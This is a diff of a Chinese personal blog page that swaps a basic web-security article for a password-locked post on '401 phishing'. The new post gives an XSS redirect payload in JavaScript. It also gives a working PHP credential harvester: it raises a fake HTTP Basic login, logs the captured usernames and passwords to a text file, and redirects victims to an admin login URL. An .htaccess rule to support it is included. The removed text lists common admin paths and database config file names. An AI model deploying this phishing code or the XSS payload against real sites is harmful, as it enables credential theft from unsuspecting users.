@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="初始端口、IP、协议、权限、状态码和CDN, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="Web基础知识，冲冲冲！！！">
+    <meta name="keywords" content="401钓鱼, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="配合URL跳转的一次401钓鱼实践笔记。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>初始端口、IP、协议、权限、状态码和CDN | Cat00011cat</title>
+    <title>401钓鱼 | Cat00011cat</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -325,7 +325,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '389924b2f9e222d3c162ca06c22d3caf650960e3a3c8ff61b55c3337a39c5f5f';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129221301.jfif')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021317.jfif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">初始端口、IP、协议、权限、状态码和CDN</h1>
+                    <h1 class="description center-align post-title">401钓鱼</h1>
                 </div>
             </div>
         </div>
@@ -377,8 +377,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="post-category">
-                                Web安全基础
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
                             </a>
                         
                     </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-17
+                    2020-02-13
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-01-30
+                    2020-02-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    506
+                    444
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 				
@@ -427,211 +427,38 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="端口常识"><a href="#端口常识" class="headerlink" title="端口常识"></a>端口常识</h2><blockquote>
-<p>计算机中拥有65535个端口</p>
-</blockquote>
-<p><strong>Apache容器的默认通信端口</strong></p>
-<ul>
-<li>HTTP端口<ul>
-<li>80端口</li>
-</ul>
-</li>
-</ul>
-<p><strong>Mysql数据库</strong></p>
-<ul>
-<li>3306</li>
-</ul>
-<p><strong>Tomcat</strong></p>
-<ul>
-<li>8080</li>
-</ul>
-<p><strong>FTP</strong></p>
-<ul>
-<li>21</li>
-</ul>
-<p><strong>SQL server数据库</strong></p>
-<ul>
-<li>1433</li>
-</ul>
-<p><strong>Oracle数据库</strong></p>
-<ul>
-<li>1521</li>
-</ul>
-<p><strong>SSH</strong></p>
-<ul>
-<li><p>Linux远程控制端口</p>
-<ul>
-<li>22</li>
-</ul>
-</li>
-</ul>
-<p><strong>Windows远程控制端口</strong></p>
-<ul>
-<li>3389</li>
-</ul>
-<h2 id="协议常识"><a href="#协议常识" class="headerlink" title="协议常识"></a>协议常识</h2><ul>
-<li><p>HTTP协议—Web（浏览器）</p>
-</li>
-<li><p>HTTPS协议</p>
-</li>
-<li><p>TCP/IP协议</p>
-</li>
-<li><p>UDP协议</p>
-</li>
-</ul>
-<p>http://(只需要用：//)</p>
-<h2 id="权限常识"><a href="#权限常识" class="headerlink" title="权限常识"></a>权限常识</h2><ul>
-<li><p><strong>网站</strong></p>
-<ul>
-<li><p>前台</p>
-<ul>
-<li>主要用于展示文章内容</li>
-</ul>
-</li>
-<li><p>后台</p>
-<ul>
-<li>主要管理文章内容</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>权限</strong></p>
-<ul>
-<li><p>前台</p>
-<ul>
-<li>Admin权限</li>
-</ul>
-</li>
-<li><p>后台</p>
-<ul>
-<li>User权限</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="常见的后台地址"><a href="#常见的后台地址" class="headerlink" title="常见的后台地址"></a>常见的后台地址</h2><p><strong>admin</strong></p>
-<ul>
-<li><p>/admin/</p>
-</li>
-<li><p>admin.php</p>
-<ul>
-<li><a href="http://www.baidu.com/admin.php" target="_blank" rel="noopener">www.baidu.com/admin.php</a></li>
-</ul>
-</li>
-</ul>
-<p><strong>manager</strong>(manage)</p>
-<p><strong>system</strong></p>
-<p><strong>adm</strong></p>
-<p><strong>administrator</strong></p>
-<p><strong>login</strong></p>
-<p><strong>admin_login</strong></p>
-<h2 id="数据库配置文件默认名称"><a href="#数据库配置文件默认名称" class="headerlink" title="数据库配置文件默认名称"></a>数据库配置文件默认名称</h2><ul>
-<li><p>PHP中默认数据库配置文件</p>
-<ul>
-<li><p>config.xxx</p>
-</li>
-<li><p>database.xxx</p>
-</li>
-<li><p>conn.php</p>
-</li>
-<li><p>data.php</p>
-</li>
-</ul>
-</li>
-<li><p>ASP中数据库配置文件</p>
-<ul>
-<li><p>Global.asa</p>
-</li>
-<li><p>conn.asp</p>
-</li>
-<li><p>config.asp</p>
-</li>
-</ul>
-</li>
-<li><p>ASP.NET数据库配置文件</p>
-<ul>
-<li>web.config</li>
-</ul>
-</li>
-</ul>
-<h2 id="权限继承"><a href="#权限继承" class="headerlink" title="权限继承"></a>权限继承</h2><p>SYSTEM——系统权限</p>
-<p>Administrator——管理员权限–&gt;&gt;apache–&gt;&gt;administrator</p>
-<p>User权限——来宾权限</p>
-<p>网站降权运行（中间件提权）——客户端——Apache——服务端</p>
-<p><strong>用户组</strong></p>
-<ul>
-<li><p>Administrator</p>
-<ul>
-<li><p>admin</p>
-<ul>
-<li>管理员权限</li>
-</ul>
-</li>
-<li><p>test</p>
-<ul>
-<li>管理员权限</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Users</p>
-<ul>
-<li><p>apache</p>
-<ul>
-<li>users</li>
-</ul>
-</li>
-<li><p>mysql</p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="状态码介绍"><a href="#状态码介绍" class="headerlink" title="状态码介绍"></a>状态码介绍</h2><ul>
-<li><p>200</p>
-<ul>
-<li>代表某个文件存在于服务端</li>
-</ul>
-</li>
-<li><p>403</p>
-<ul>
-<li>代表客户端无权限访问某个目录或文件</li>
-</ul>
-</li>
-<li><p>404</p>
-<ul>
-<li>代表某个目录或文件不存在</li>
-</ul>
-</li>
-<li><p>500</p>
-<ul>
-<li>代表服务端因为某些原因导致出错</li>
-</ul>
-</li>
-<li><p>502</p>
-<ul>
-<li>当物理服务器不在进行工作。CDN就会返回一个502状态码</li>
-</ul>
-</li>
-<li><p>跳转</p>
-<ul>
-<li><p>301</p>
-<ul>
-<li>永久性跳转（thecat.top—<a href="http://www.thecat.top">www.thecat.top</a> 爬虫会收录跳转的新连接权重会慢慢转移）</li>
-</ul>
-</li>
-<li><p>302</p>
-<ul>
-<li>临时性跳转</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么?"></a>CDN是什么?</h2><p>内容分发服务器–加速网页打开速度。</p>
-<p>就近原则。</p>
-<h2 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h2><p>绝对路径从盘符开始，相对路径从根目录开始。</p>
-<script>
+                <h3 id="一、XSS-URL-跳转"><a href="#一、XSS-URL-跳转" class="headerlink" title="一、XSS URL 跳转"></a>一、XSS URL 跳转</h3><p>测试账号：13140000000<br>JS跳转代码：</p>
+<pre><code>&lt;script language="JavaScript" type="text/javascript"&gt;window.location.href='YOU URL'; &lt;/script&gt;</code></pre><p>当我们将其插入到有XSS漏洞的地方，网页会立马跳转到我们的网页</p>
+<p>那么如何去掉反弹，让网页不在跳转到其它页面呢？？</p>
+<p>首先开启BURP抓包，然后进入含有我们插入XSS URL恶意跳转的页面，进行抓包拦截；单击右键-Do intercept-response to this request （抓取返回包） 接着点击 放过 ；等待BURP抓取返回包（服务器传输给客户端的数据包）在返回包里找到我们那段代码将其删除，这样网页就不会跳转了；最后在最初我们插入XSS跳转代码的地方，将这段恶意代码彻底的删除。这样就OK了。</p>
+<p><strong>图文过程：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115758.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115759.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115800.png" alt=""></p>
+<p><strong>去掉反弹跳转过程</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115801.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115804.png" alt=""></p>
+<p>响应包：</p>
+<p>思路：在响应包里找到我们插入的恶意代码，将其删除，并且放过数据包。从而不让客户端跳转到其他页面。进而回到客户端添加代码的地方，将其永久删除。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115805.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115802.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115803.png" alt=""></p>
+<p>完成。</p>
+<h3 id="二、401登录认证钓鱼"><a href="#二、401登录认证钓鱼" class="headerlink" title="二、401登录认证钓鱼"></a>二、401登录认证钓鱼</h3><p>首先代码：保存为1.php</p>
+<pre><code>
+&lt;?php
+
+if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW'])) {
+    Header("WWW-Authenticate: Basic realm=\"USER LOGIN\"");
+    Header("HTTP/1.0 401 Unauthorized");
+} else {
+    @file_put_contents('./b4dboy.txt', $_SERVER['PHP_AUTH_USER'].'|'.$_SERVER['PHP_AUTH_PW']."\r\n", FILE_APPEND);
+    header("Location: http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login");
+}
+
+?&gt;
+开启401</code></pre><p>接着创建文件 .htaccess 写入内容</p>
+<pre><code>Options +FollowSymlinks -Multiviews RewriteEngine On #Authorization Headers RewriteCond %{HTTP:Authorization} ^(.+)$ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -674,7 +501,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/23999.html">http://www.thecat.top/posts/23999.html</a>
+                    <a href="http://www.thecat.top/posts/25443.html">http://www.thecat.top/posts/25443.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -884,7 +711,7 @@
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-01-17T00-28-33',
+        id: '2020-02-13T23-31-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1172,30 +999,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/9391.html">
+                <a href="/posts/48769.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129223315.jfif" class="responsive-img" alt="Burp安装与实践">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218001734.jfif" class="responsive-img" alt="硬盘故障">
                         
-                        <span class="card-title">Burp安装与实践</span>
+                        <span class="card-title">硬盘故障</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Burp安装、汉化与实践-了解数据传输的真面目与Burp的原理
+                            关于一次移动硬盘插入电脑可以识别设备，驱动也没问题，但是计算机不显示硬盘文件夹问题解决方案。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-17
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-17
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B7%A5%E6%AC%B2%E5%96%84%E5%85%B6%E4%BA%8B%E5%BF%85%E5%85%88%E5%88%A9%E5%85%B6%E5%99%A8/" class="post-category">
-                                    工欲善其事必先利其器
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-category">
+                                    计算机
                                 </a>
                             
                             
@@ -1205,8 +1032,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">网络安全</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                        <span class="chip bg-color">计算机</span>
                     </a>
                     
                 </div>
@@ -1220,30 +1047,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/15611.html">
+                <a href="/posts/30324.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129223037.jfif" class="responsive-img" alt="网站是如何组成的呢？">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209160430.jfif" class="responsive-img" alt="快速查看端口被谁占用了">
                         
-                        <span class="card-title">网站是如何组成的呢？</span>
+                        <span class="card-title">快速查看端口被谁占用了</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            互联网上的网站是如何搭建并运行还能让互联网用户访问的呢？
+                            快速查看端口被XXX占用。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-13
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="post-category">
-                                    Web安全基础
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-category">
+                                    计算机
                                 </a>
                             
                             
@@ -1253,8 +1080,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">网络安全</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                        <span class="chip bg-color">计算机</span>
                     </a>
                     
                 </div>
